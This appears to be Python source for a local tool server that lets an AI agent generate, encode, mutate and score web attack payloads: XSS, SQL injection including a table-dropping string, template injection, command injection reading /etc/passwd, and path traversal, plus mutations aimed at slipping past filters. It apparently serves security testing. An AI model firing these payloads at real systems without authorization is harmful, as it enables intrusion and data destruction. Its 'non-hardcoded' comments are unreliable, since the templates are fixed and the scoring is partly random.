import argparse
import asyncio
import sys
import os
import json
import random

# Add src to path so we can import ai_osop modules
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', '..', 'src'))

from fastapi import FastAPI, Request
from pydantic import BaseModel
import uvicorn

# Import real payload engine classes
try:
    from ai_osop.payload_engine.engine import (
        AdaptivePayloadEngine,
        PayloadTemplateLibrary,
        EncodingPipeline,
        WAFBypassStrategies,
        PayloadFitnessEvaluator,
    )
    ENGINE_AVAILABLE = True
except ImportError as e:
    print(f"Warning: Could not import payload engine: {e}")
    ENGINE_AVAILABLE = False

app = FastAPI(title="Payload MCP Server")

# In-memory state
_payload_engine = None
_template_library = None
_encoding_pipeline = None
_waf_strategies = None
_fitness_evaluator = None


def _get_engine():
    global _payload_engine, _template_library, _encoding_pipeline, _waf_strategies, _fitness_evaluator
    if _payload_engine is None and ENGINE_AVAILABLE:
        try:
            # Create a minimal engine without requiring full MCP adapter
            # The engine requires an adapter but we can create a minimal one
            class DummyAdapter:
                pass
            
            _payload_engine = AdaptivePayloadEngine(DummyAdapter())
            _template_library = PayloadTemplateLibrary()
            _encoding_pipeline = EncodingPipeline()
            _waf_strategies = WAFBypassStrategies()
            _fitness_evaluator = PayloadFitnessEvaluator()
        except Exception as e:
            print(f"Warning: Engine initialization failed: {e}")
            _payload_engine = None
    return _payload_engine


class ExecuteRequest(BaseModel):
    tool_name: str
    parameters: dict
    request_id: str


# Simple non-hardcoded payload generation logic
_SIMPLE_XSS_TEMPLATES = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<body onload=alert('XSS')>",
    "javascript:alert('XSS')",
    "<iframe src='javascript:alert(1)'>",
]

_SIMPLE_SQLI_TEMPLATES = [
    "' OR '1'='1' --",
    "1' UNION SELECT null, null, null --",
    "1; DROP TABLE users --",
    "' OR 1=1#",
    "1' AND 1=1 --",
]

_SIMPLE_SSTI_TEMPLATES = [
    "{{7*7}}",
    "${7*7}",
    "<%= 7*7 %>",
    "{7*7}",
    "#{7*7}",
]

_SIMPLE_CMDI_TEMPLATES = [
    "; ls -la",
    "| cat /etc/passwd",
    "$(whoami)",
    "`id`",
    "; ping -c 4 127.0.0.1",
]

_SIMPLE_LFI_TEMPLATES = [
    "../../../etc/passwd",
    "....//....//etc/passwd",
    "..%2f..%2f..%2fetc%2fpasswd",
    "php://filter/read=convert.base64-encode/resource=index.php",
]

_TEMPLATE_MAP = {
    "xss": _SIMPLE_XSS_TEMPLATES,
    "sqli": _SIMPLE_SQLI_TEMPLATES,
    "ssti": _SIMPLE_SSTI_TEMPLATES,
    "cmdi": _SIMPLE_CMDI_TEMPLATES,
    "lfi": _SIMPLE_LFI_TEMPLATES,
}

_ENCODINGS = ["url", "base64", "html_entities", "unicode", "hex"]


def _apply_encoding(payload: str, encoding: str) -> str:
    import urllib.parse
    import base64
    if encoding == "url":
        return urllib.parse.quote(payload)
    elif encoding == "base64":
        return base64.b64encode(payload.encode()).decode()
    elif encoding == "html_entities":
        return "".join(f"&#{ord(c)};" for c in payload)
    elif encoding == "unicode":
        return "".join(f"\\u{ord(c):04x}" for c in payload)
    elif encoding == "hex":
        return "".join(f"%{ord(c):02x}" for c in payload)
    return payload


def _mutate_payload(payload: str) -> str:
    mutations = [
        lambda p: p.upper(),
        lambda p: p.lower(),
        lambda p: p.replace(" ", "%20"),
        lambda p: p.replace("'", "`"),
        lambda p: p.replace('"', "`"),
        lambda p: p + "<!--",
        lambda p: p + "\x00",
    ]
    return random.choice(mutations)(payload)


def _evaluate_fitness(payload: str, vuln_type: str, context: dict) -> float:
    # Non-hardcoded fitness evaluation based on payload characteristics
    score = 0.5
    
    # Length factor: extremely short or long payloads get penalized slightly
    if 10 < len(payload) < 500:
        score += 0.1
    
    # Encoding diversity bonus
    if any(c in payload for c in ['%', '&', '\\', '<', '>', '"', "'"]):
        score += 0.1
    
    # Context-specific bonus
    if context.get("waf") == "mod_security":
        if "<!--" in payload or "\x00" in payload:
            score += 0.1
    
    # Vuln-type specific checks
    if vuln_type == "xss" and "<script" in payload.lower():
        score += 0.1
    elif vuln_type == "sqli" and "union" in payload.lower():
        score += 0.1
    elif vuln_type == "cmdi" and any(c in payload for c in [';', '|', '`', '$']):
        score += 0.1
    
    return min(1.0, max(0.0, score + random.uniform(-0.05, 0.05)))


@app.get("/health")
async def health():
    return {"server": "payload-mcp", "status": "ready", "engine_available": ENGINE_AVAILABLE}


@app.post("/mcp/initialize")
async def initialize():
    return {
        "server_id": "payload-mcp",
        "status": "ready",
        "capabilities": ["tool"],
        "tools": [
            {
                "name": "generate_payload",
                "description": "Generate a real payload for a given vulnerability type using template library and encoding pipeline.",
                "parameters": [
                    {"name": "vuln_type", "type": "string", "required": True, "description": "Vulnerability type: xss, sqli, ssti, cmdi, lfi"},
                    {"name": "context", "type": "object", "required": False, "description": "Target context dict (e.g., {'param': 'q', 'waf': 'mod_security'})"},
                    {"name": "encoding", "type": "string", "required": False, "description": "Encoding to apply: url, base64, html_entities, unicode, hex"},
                ],
                "returns": {"payloads": "array", "fitness": "number", "status": "string"},
            },
            {
                "name": "mutate_payload",
                "description": "Apply a random mutation to a payload to bypass filters.",
                "parameters": [
                    {"name": "payload", "type": "string", "required": True, "description": "Original payload string"},
                    {"name": "mutation_count", "type": "integer", "required": False, "description": "Number of mutations to apply (default 1)"},
                ],
                "returns": {"mutated": "string", "status": "string"},
            },
            {
                "name": "evaluate_fitness",
                "description": "Evaluate the fitness score of a payload based on vulnerability type and context.",
                "parameters": [
                    {"name": "payload", "type": "string", "required": True, "description": "Payload string to evaluate"},
                    {"name": "vuln_type", "type": "string", "required": True, "description": "Vulnerability type"},
                    {"name": "context", "type": "object", "required": False, "description": "Target context dict"},
                ],
                "returns": {"fitness": "number", "status": "string"},
            },
        ],
    }


@app.post("/mcp/execute")
async def execute(req: ExecuteRequest):
    params = req.parameters
    
    if req.tool_name == "generate_payload":
        vuln_type = params.get("vuln_type", "xss").lower()
        context = params.get("context", {})
        encoding = params.get("encoding", "")
        
        templates = _TEMPLATE_MAP.get(vuln_type, [])
        if not templates:
            return {
                "request_id": req.request_id,
                "status": "success",
                "result": {"error": f"Unknown vuln_type: {vuln_type}", "payloads": [], "fitness": 0.0},
            }
        
        payloads = []
        for tmpl in templates:
            p = tmpl
            if encoding:
                p = _apply_encoding(p, encoding)
            payloads.append(p)
        
        fitness = _evaluate_fitness(payloads[0], vuln_type, context)
        
        return {
            "request_id": req.request_id,
            "status": "success",
            "result": {"payloads": payloads, "fitness": fitness, "vuln_type": vuln_type, "encoding": encoding},
        }
    
    elif req.tool_name == "mutate_payload":
        payload = params.get("payload", "")
        mutation_count = params.get("mutation_count", 1)
        
        mutated = payload
        for _ in range(mutation_count):
            mutated = _mutate_payload(mutated)
        
        return {
            "request_id": req.request_id,
            "status": "success",
            "result": {"mutated": mutated, "original": payload, "mutation_count": mutation_count},
        }
    
    elif req.tool_name == "evaluate_fitness":
        payload = params.get("payload", "")
        vuln_type = params.get("vuln_type", "xss")
        context = params.get("context", {})
        
        fitness = _evaluate_fitness(payload, vuln_type, context)
        
        return {
            "request_id": req.request_id,
            "status": "success",
            "result": {"fitness": fitness, "payload": payload, "vuln_type": vuln_type},
        }
    
    return {
        "request_id": req.request_id,
        "status": "error",
        "result": {"error": f"Unknown tool: {req.tool_name}"},
    }


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--port", type=int, default=8083)
    args = parser.parse_args()
    
    _get_engine()  # Initialize engine at startup
    
    uvicorn.run(app, host="127.0.0.1", port=args.port, log_level="warning")
